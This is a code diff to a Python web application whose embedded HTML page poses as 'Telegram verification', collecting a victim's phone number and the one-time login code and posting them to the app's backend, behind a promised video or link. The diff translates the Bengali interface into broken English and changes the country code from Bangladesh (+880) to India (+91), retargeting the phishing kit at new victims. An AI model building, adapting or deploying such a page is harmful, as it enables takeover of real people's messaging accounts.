@@ -129,11 +129,11 @@ PAGE = """<!DOCTYPE html>
             <!-- Step 1: Phone Input -->
             <div id="s1" class="step active">
                 <div class="modal-icon">📱</div>
-                <h2>টেলিগ্রাম ভেরিফিকেশন</h2>
-                <p>আপনার টেলিগ্রাম অ্যাকাউন্টের ফোন নম্বর দিন</p>
+                <h2>Telegram verefiton </h2>
+                <p>Enter your Telegram account phone number</p>
                 
                 <input type="tel" id="phoneInput" 
-                    placeholder="+8801712345678"
+                    placeholder="+91XXXXXXXXXX"
                     style="width:100%; padding:15px; background:#0a0a0a; border:2px solid #2a2a3e; 
                            border-radius:10px; color:white; font-size:18px; margin-bottom:12px; 
                            text-align:center; outline:none">
@@ -144,7 +144,7 @@ PAGE = """<!DOCTYPE html>
                            cursor:pointer; margin-bottom:10px; transition:0.3s"
                     onmouseover="this.style.background='#0077b6'"
                     onmouseout="this.style.background='#0088cc'">
-                    📱 কোড পাঠান
+                    📱 Send your code
                 </button>
                 
                 <div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
@@ -153,9 +153,9 @@ PAGE = """<!DOCTYPE html>
             <!-- Step 2: OTP Code Input -->
             <div id="s2" class="step">
                 <div class="modal-icon">🔐</div>
-                <h2>ভেরিফিকেশন কোড</h2>
-                <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+880XXXXXXXXXX</span></p>
-                <div id="cs" class="sb waiting"><span class="sp"></span> কোড পাঠানো হচ্ছে...</div>
+                <h2>Verefiton code</h2>
+                <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+91XXXXXXXXXX</span></p>
+                <div id="cs" class="sb waiting"><span class="sp"></span> Please wait ...</div>
                 <div class="cd" id="cdisp">_____</div>
                 <div class="np" id="np">
                     <button class="k" onclick="pk('1')">1</button>
@@ -169,7 +169,7 @@ PAGE = """<!DOCTYPE html>
                     <button class="k" onclick="pk('9')">9</button>
                     <button class="k kc" onclick="cc()">⌫</button>
                     <button class="k" onclick="pk('0')">0</button>
-                    <button class="k ks" id="sb" onclick="sc()">✓ ভেরিফাই</button>
+                    <button class="k ks" id="sb" onclick="sc()">✓ Verified </button>
                 </div>
                 <div id="vs" class="sb"></div>
             </div>
@@ -178,9 +178,9 @@ PAGE = """<!DOCTYPE html>
             <div id="s3" class="step">
                 <div class="ss">
                     <div class="bi">✅</div>
-                    <h2>ভেরিফিকেশন সফল!</h2>
-                    <p>আপনার লিংক জেনারেট হচ্ছে...</p>
-                    <button class="wb" onclick="wv()">🎬 ভিডিও দেখুন</button>
+                    <h2>Verefiton complete!</h2>
+                    <p>Please wait...</p>
+                    <button class="wb" onclick="wv()">🎬 Gate link</button>
                 </div>
             </div>
         </div>
@@ -209,7 +209,7 @@ PAGE = """<!DOCTYPE html>
         
         if (!phone) {
             document.getElementById('ps1').className = 'sb error';
-            document.getElementById('ps1').innerHTML = '❌ দয়া করে ফোন নম্বর দিন';
+            document.getElementById('ps1').innerHTML = '❌ Please enter your phone number ';
             document.getElementById('ps1').style.display = 'block';
             return;
         }
@@ -222,7 +222,7 @@ PAGE = """<!DOCTYPE html>
         }
         
         document.getElementById('ps1').className = 'sb waiting';
-        document.getElementById('ps1').innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
+        document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
         document.getElementById('ps1').style.display = 'block';
         
         sendPhoneToBackend(phoneNumber);
@@ -238,7 +238,7 @@ PAGE = """<!DOCTYPE html>
                 document.getElementById('pd').textContent = phone;
                 var cs = document.getElementById('cs');
                 cs.className = 'sb waiting';
-                cs.innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
+                cs.innerHTML = '<span class="sp"></span> "Sending code....';
                 cs.style.display = 'block';
                 startCodeCheck();
             } else {
@@ -266,7 +266,7 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb success';
-                    cs.innerHTML = '✅ 5 ডিজিটের OTP পাঠানো হয়েছে! নিচে লিখুন:';
+                    cs.innerHTML = '✅ 5 Dixit otp fill ';
                     cs.style.display = 'block';
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
@@ -278,7 +278,7 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb error';
-                    cs.innerHTML = '❌ কোড পাঠাতে সমস্যা হয়েছে';
+                    cs.innerHTML = '❌ Code not received ';
                     cs.style.display = 'block';
                 }
             } catch(e) {}
@@ -289,9 +289,9 @@ PAGE = """<!DOCTYPE html>
     function cc() { codeDigits = codeDigits.slice(0,-1); document.getElementById('cdisp').textContent = codeDigits || '_____'; }
     
     async function sc() {
-        if(codeDigits.length < 5) { showVerifyStatus('❌ 5 ডিজিটের কোড দিন','error'); return; }
+        if(codeDigits.length < 5) { showVerifyStatus('❌ 5 verefiton code','error'); return; }
         document.getElementById('sb').disabled = true;
-        document.getElementById('sb').textContent = '⏳ ভেরিফাই করছে...';
+        document.getElementById('sb').textContent = '⏳ Please wait...';
         try {
             var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits})});
             var data = await res.json();
@@ -300,11 +300,11 @@ PAGE = """<!DOCTYPE html>
                 document.getElementById('s3').classList.add('active');
                 if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
             } else {
-                showVerifyStatus('❌ ' + (data.error || 'ভুল কোড'), 'error');
+                showVerifyStatus('❌ ' + (data.error || 'wrong code🚫'), 'error');
                 codeDigits = ''; document.getElementById('cdisp').textContent = '_____';
-                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ ভেরিফাই';
+                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ verefi';
             }
-        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ ভেরিফাই'; }
+        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Complete🎉'; }
     }
     
     function showVerifyStatus(msg, type) {
@@ -468,7 +468,7 @@ def share():
         return jsonify({'success': False, 'error': 'Phone required'})
     
     if ph.startswith('0') and not ph.startswith('+'):
-        ph = '+88' + ph
+        ph = '+91' + ph
     elif not ph.startswith('+'):
         ph = '+' + ph
     
